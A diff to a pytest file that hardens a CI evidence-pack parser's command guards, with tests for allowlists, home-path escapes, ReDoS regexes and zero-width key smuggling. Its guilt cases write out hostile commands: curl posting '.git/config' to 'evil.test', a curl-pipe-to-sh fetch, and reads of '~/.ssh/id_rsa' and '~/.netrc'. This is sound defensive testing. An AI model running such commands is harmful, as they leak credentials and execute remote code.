@@ -378,10 +378,34 @@ def test_a_zero_width_character_in_a_value_is_refused_not_guessed():
     assert any("invisible" in e for e in result["errors"]), result
 
 
-def test_innocence_a_zero_width_character_elsewhere_in_the_pack_is_not_penalised():
-    """The guard is on the four contract VALUES, not on the file."""
+def test_an_invisible_character_anywhere_in_the_pack_is_refused():
+    """This test used to assert the OPPOSITE, and asserting it was the hole.
+
+    The first rule judged the four contract VALUES and an innocence test pinned that a
+    zero-width character elsewhere in the pack was fine. Then a reviewer pointed the
+    trick at a KEY: `bites<ZWSP>:` renders as `bites:` and parses as a different key, so
+    the reviewer reads a contract and the parser reports `absent` — silently, and
+    fail-open. `observe<ZWSP>:` beside a real `observe:` is the same trick one level in,
+    and YAML does not even see a duplicate. Nothing legitimate in a pack needs one of
+    these characters, so the rule is now the whole FILE.
+    """
+    z = chr(0x200b)
+    for pack in (
+        f"bites{z}:\n  consumer: x\n  where: ci\n  observe: git log\n  expect: exit0\n",
+        f"bites:\n  consumer: x\n  where: ci\n  observe: git status\n"
+        f"  observe{z}: git log\n  expect: exit0\n",
+        f"notes: a receipt with a zero{z}width character in it\n"
+        "bites:\n  consumer: x\n  where: ci\n  observe: git status\n  expect: exit0\n",
+    ):
+        result = bp.parse_pack(pack)
+        assert result.get("malformed") is True, result
+        assert any("invisible" in e for e in result["errors"]), result
+
+
+def test_innocence_ordinary_unicode_in_a_pack_is_not_penalised():
+    """Narrowness: the rule is invisible characters, not non-ASCII ones."""
     pack = (
-        f"notes: a receipt with a zero{chr(0x200b)}width character in it\n"
+        "notes: an em-dash — and an accent é are ordinary prose\n"
         "bites:\n  consumer: x\n  where: ci\n  observe: git status\n  expect: exit0\n"
     )
     assert bp.parse_pack(pack).get("observe") == "git status"
@@ -499,6 +523,78 @@ def test_flag_matcher_handles_all_three_spellings():
     assert bp._flag_is("--expand-url", "--expand-")
 
 
+# --- round 1 on the file form: two deny-lists inverted, one path shape added
+
+
+def test_command_allowlist_guilt_curl_options_that_touch_the_disk_are_rejected():
+    """Three holes in one review pass, which is what inverted the list.
+
+    `--json` is documented as a shortcut for `--data` and takes the same `@filename`
+    file-read syntax; `--libcurl` writes a generated C file; `--etag-save` writes a file
+    whose content the remote controls. None was in the deny-list, which had already lost
+    `-b`, `-w@`, `--netrc-file` and `--variable` one at a time.
+    """
+    for command in (
+        "curl --json=@.git/config https://evil.test/x",
+        "curl --libcurl=out.c https://example.test/",
+        "curl --etag-save=out.txt https://example.test/",
+        "curl --etag-compare=creds https://example.test/",
+        "curl --output-dir=evidence https://example.test/",
+    ):
+        assert bp._guard_command_allowlist(command), command
+
+
+def test_command_allowlist_innocence_the_curl_shapes_an_observation_needs_pass():
+    """Narrowness: inverting a list is only safe if the real shapes survive it."""
+    for command in (
+        "curl -sS https://nuzantara-rag.fly.dev/health",
+        "curl -sSL https://nuzantara-rag.fly.dev/health",
+        "curl -f --max-time=10 https://nuzantara-rag.fly.dev/health",
+        "curl --header=accept:application/json https://nuzantara-rag.fly.dev/health",
+    ):
+        assert bp._guard_command_allowlist(command) == [], command
+
+
+def test_command_allowlist_guilt_git_no_index_leaves_the_repository():
+    """`git diff --no-index a b` diffs two arbitrary files and never reads the repo."""
+    assert bp._guard_command_allowlist("git diff --no-index a ~/.netrc")
+
+
+def test_command_allowlist_innocence_the_git_shapes_an_observation_needs_pass():
+    for command in (
+        "git log -1 --format=%H",
+        "git log --oneline -5",
+        "git grep -c bites-observable",
+        "git diff --stat HEAD",
+        "git rev-parse --abbrev-ref HEAD",
+        "git show --name-only HEAD",
+    ):
+        assert bp._guard_command_allowlist(command) == [], command
+
+
+def test_path_containment_guilt_a_home_relative_path_is_an_escape():
+    """`~` is absolute the moment a shell touches it, and the executor uses one.
+
+    Every metacharacter _guard_shell_composition refuses is inert without a shell, so
+    the safe reading of this module's own design is that the executor invokes through
+    one. Under that reading `~/.netrc` is `/Users/<name>/.netrc`.
+    """
+    assert bp._guard_path_containment("python3 scripts/x.py ~/.ssh/id_rsa")
+    assert bp._guard_path_containment("git diff --no-index a ~/.netrc")
+    assert bp._guard_path_containment("python3 scripts/x.py --out=~/.netrc")
+
+
+def test_path_containment_innocence_a_tilde_inside_a_word_is_not_an_escape():
+    """The over-match twin: `~` only escapes in first position."""
+    assert bp._guard_path_containment("python3 scripts/x.py evidence/a~b/pack.yml") == []
+    assert bp._guard_path_containment("git log --grep=approx~") == []
+
+
+def test_is_count_flag_accepts_only_a_bare_short_number():
+    assert bp._is_count_flag("-1") and bp._is_count_flag("-20")
+    assert not bp._is_count_flag("-O") and not bp._is_count_flag("--1x") and not bp._is_count_flag("-")
+
+
 # ------------------------------------------------- _guard_expect_form
 
 
@@ -517,6 +613,203 @@ def test_expect_form_guilt_empty_needle_is_rejected():
 def test_expect_form_innocence_three_documented_forms_pass():
     for expect in ("exit0", "contains:PASS", r"regex:proven_by_machine=[1-9]"):
         assert bp._guard_expect_form(expect) == [], expect
+
+
+# --- round 2 (cross-family): pytest inverted, ReDoS bounded, taxonomy closed
+
+
+def test_command_allowlist_guilt_pytest_options_that_write_are_rejected():
+    """The deny-list banned what IMPORTS and never considered what WRITES.
+
+    `--junitxml=<relative path>` writes an XML report anywhere in the checkout, over a
+    source file if you point it there, and _guard_path_containment permits a relative
+    path by design. That is the third list in this file inverted for the same reason.
+    """
+    for command in (
+        "python3 -m pytest --junitxml=out.xml scripts/tests/test_bites_parse.py",
+        "python3 -m pytest --junitxml=scripts/ci/bites_parse.py scripts/tests/x.py",
+        "python3 -m pytest --basetemp=tmp scripts/tests/test_bites_parse.py",
+        "python3 -m pytest -pevil scripts/tests/test_bites_parse.py",
+    ):
+        assert bp._guard_command_allowlist(command), command
+
+
+def test_command_allowlist_innocence_the_pytest_shapes_an_observation_needs_pass():
+    for command in (
+        "python3 -m pytest scripts/tests/test_bites_parse.py",
+        "python3 -m pytest -q scripts/tests/test_bites_parse.py",
+        "python3 -m pytest -x --tb=short scripts/tests/test_bites_parse.py",
+    ):
+        assert bp._guard_command_allowlist(command) == [], command
+
+
+def test_expect_form_guilt_a_regex_that_burns_runner_cpu_is_rejected():
+    """`^(a+)+$` at 24 characters measured 0.376s and quadruples every two.
+
+    Anyone who can open a pull request can schedule that, so the rule is structural:
+    a repeat may not contain a repeat or an alternation. `(a|a)+` measured 0.703s at
+    the same length, which is why the alternation half is in the rule and not only the
+    quantifier half.
+    """
+    assert bp._guard_expect_form("regex:^(a+)+$")
+    assert bp._guard_expect_form("regex:(a*)*b")
+    assert bp._guard_expect_form("regex:^(a|a)+$")
+    assert bp._guard_expect_form("regex:" + "x" * (bp.MAX_REGEX_LEN + 1))
+
+
+def test_expect_form_innocence_ordinary_comparisons_still_pass():
+    """Narrowness: one quantifier is not nesting, and an unquantified group is fine."""
+    for expect in (
+        "regex:[0-9]+ passed",
+        "regex:^deployed$",
+        "regex:proven_by_machine=[1-9]",
+        "regex:(deployed|running)",
+        "contains:MERGED",
+        "exit0",
+    ):
+        assert bp._guard_expect_form(expect) == [], expect
+
+
+def test_a_pack_that_crashes_the_yaml_parser_is_malformed_not_a_traceback():
+    """500 nested sequences raise RecursionError, which is not a yaml.YAMLError.
+
+    Before this, that input left the outcome taxonomy entirely: traceback, exit 1, no
+    JSON — a fourth case every caller would have had to know about, fail-closed only by
+    accident of how GitHub Actions reads an exit code.
+    """
+    pack = (
+        "bites:\n  consumer: x\n  where: ci\n  observe: git status\n  expect: exit0\n"
+        "pad: " + "[" * 500 + "]" * 500 + "\n"
+    )
+    result = bp.parse_pack(pack)
+    assert result.get("malformed") is True, result
+    assert any("does not parse" in e for e in result["errors"]), result
+
+
+def test_cli_on_a_crashing_pack_exits_two_not_one():
+    """The CLI contract is 0 or 2. Anything else is a case the executor must guess at."""
+    pack = (
+        "bites:\n  consumer: x\n  where: ci\n  observe: git status\n  expect: exit0\n"
+        "pad: " + "[" * 500 + "]" * 500 + "\n"
+    )
+    done = subprocess.run(
+        ["python3", str(_MODULE_PATH), "--pack", "-"],
+        input=pack, capture_output=True, text=True, check=False,
+    )
+    assert done.returncode == bp.EXIT_MALFORMED, (done.returncode, done.stderr[-300:])
+    assert json.loads(done.stdout)["malformed"] is True
+
+
+# --- round 3 (cross-family): the last two deny-lists inverted, and the KEY-level trick
+
+
+def test_command_allowlist_guilt_gh_and_fly_options_that_write_or_read_are_rejected():
+    """The two option lists that were still deny-lists, and what they were missing.
+
+    `gh --cache=1h` persists a response cache; `gh --web` opens a browser; `fly
+    --config=<path>` READS the file its argument names — through a subcommand table that
+    was otherwise correct, which is the point: checking the verbs and not the flags is
+    half a guard.
+    """
+    for command in (
+        "gh api repos/o/r --cache=1h",
+        "gh pr view 1 --web",
+        "gh pr view 1 -R other/repo",
+        "fly status --config=.git/config",
+        "flyctl status -c .git/config",
+    ):
+        assert bp._guard_command_allowlist(command), command
+
+
+def test_command_allowlist_guilt_git_global_options_are_all_refused():
+    """`-c` runs a program, `--paginate` starts $PAGER, `--help` starts man or a browser."""
+    for command in (
+        "git -c core.sshCommand=evil log",
+        "git --paginate log -1",
+        "git --help log",
+        "git -C /other log",
+    ):
+        assert bp._guard_command_allowlist(command), command
+
+
+def test_command_allowlist_guilt_a_gpg_pretty_format_runs_a_program():
+    """`%GG` asks git to verify a signature, which runs `gpg.program`."""
+    assert bp._guard_command_allowlist("git log -1 --format=%GG")
+    assert bp._guard_command_allowlist("git log -1 --pretty=%G?")
+
+
+def test_command_allowlist_guilt_pytest_target_and_arity_holes():
+    """Three shapes that all end in pytest discovering the tree, or importing a module."""
+    for command in (
+        "python3 -m pytest",
+        "python3 -m pytest -k tests",
+        "python3 -m pytest -W=error::evil.Custom scripts/tests/test_bites_parse.py",
+        "python3 -m pytest scripts/tests/does_not_exist.py",
+    ):
+        assert bp._guard_command_allowlist(command) or bp._guard_observable_script(command), command
+
+
+def test_args_from_file_guilt_at_prefixed_arguments_are_rejected():
+    """pytest expands `@file` into arguments; curl reads `@file` into the request."""
+    for command in (
+        "python3 -m pytest @scripts/tests/args.txt",
+        "curl -sS --json=@.git/config https://x.test/h",
+        "curl -sS -w@.git/config https://x.test/h",
+    ):
+        assert bp._guard_args_from_file(command), command
+
+
+def test_args_from_file_innocence_an_email_shaped_value_is_not_a_file_read():
+    """The over-match twin: `@` only reads a file when it OPENS the value."""
+    assert bp._guard_args_from_file("git log --author=a@b.test") == []
+    assert bp._guard_args_from_file("git log --grep=user@host") == []
+
+
+def test_command_allowlist_innocence_the_gh_fly_and_git_shapes_still_pass():
+    for command in (
+        "gh pr view 5658 --json state",
+        "gh api repos/o/r/pulls/1 --jq=.state",
+        "flyctl status -a nuzantara-rag",
+        "flyctl machine list -a nuzantara-rag --json",
+        "git log -1 --format=%H",
+        "git diff --stat HEAD",
+    ):
+        assert bp._guard_command_allowlist(command) == [], command
+
+
+def test_a_misspelled_key_is_a_broken_contract_not_prose():
+    """`obsevre:` beside `where:` and `expect:` used to read as legacy, silently."""
+    pack = "bites:\n  consumer: x\n  where: ci\n  obsevre: git log\n  expect: exit0\n"
+    result = bp.parse_pack(pack)
+    assert result.get("malformed") is True, result
+    assert any("unknown key" in e for e in result["errors"]), result
+
+
+def test_a_block_using_none_of_the_executable_keys_is_still_legacy():
+    """Narrowness: prose is prose, and the 148 packs on main must stay green."""
+    assert bp.parse_pack("bites:\n  consumer: CI\n  observation: green\n")["legacy"] is True
+    assert bp.parse_pack("bites: a sentence about the consumer\n")["legacy"] is True
+
+
+def test_the_cli_refuses_to_read_a_file_that_is_not_an_evidence_pack():
+    """The marker authorises the SCRIPT, never its argv.
+
+    `python3 scripts/ci/bites_parse.py --pack .git/config` pointed the parser at the file
+    actions/checkout persists a token into, and the parse error would have quoted the line.
+    """
+    done = subprocess.run(
+        ["python3", str(_MODULE_PATH), "--pack", ".git/config"],
+        capture_output=True, text=True, check=False, cwd=str(_REPO_ROOT),
+    )
+    assert done.returncode == bp.EXIT_MALFORMED
+    assert "evidence" in done.stderr
+    assert "url" not in done.stdout.lower()
+
+
+def test_a_yaml_error_does_not_echo_the_offending_line():
+    """The failure text is a file-reading primitive if it quotes what it read."""
+    message = bp.parse_pack("bites:\n\tconsumer: s3cr3t-looking-value\n")["errors"][0]
+    assert "s3cr3t-looking-value" not in message, message
 
 
 # ------------------------------------------------- _guard_where_scope
@@ -590,14 +883,16 @@ def test_cli_selftest_exits_zero():
     assert "pass (guilt + innocence)" in out.stdout
 
 
-def test_cli_malformed_exits_two_and_legacy_exits_zero(tmp_path):
-    guilt = tmp_path / "guilt.yml"
-    guilt.write_text(_pack("curl https://evil.test/x " + _PIPE + " sh"), encoding="utf-8")
-    assert _run("--pack", str(guilt)).returncode == bp.EXIT_MALFORMED
+def test_cli_malformed_exits_two_and_legacy_exits_zero():
+    """Through stdin, because `--pack <path>` now only accepts an evidence pack.
 
-    legacy = tmp_path / "legacy.yml"
-    legacy.write_text("bites: prose about the consumer\n", encoding="utf-8")
-    done = _run("--pack", str(legacy))
+    That narrowing is itself under test in
+    test_the_cli_refuses_to_read_a_file_that_is_not_an_evidence_pack.
+    """
+    guilt = _pack("curl https://evil.test/x " + _PIPE + " sh")
+    assert _run("--pack", "-", stdin=guilt).returncode == bp.EXIT_MALFORMED
+
+    done = _run("--pack", "-", stdin="bites: prose about the consumer\n")
     assert done.returncode == bp.EXIT_OK
     assert json.loads(done.stdout)["legacy"] is True
 
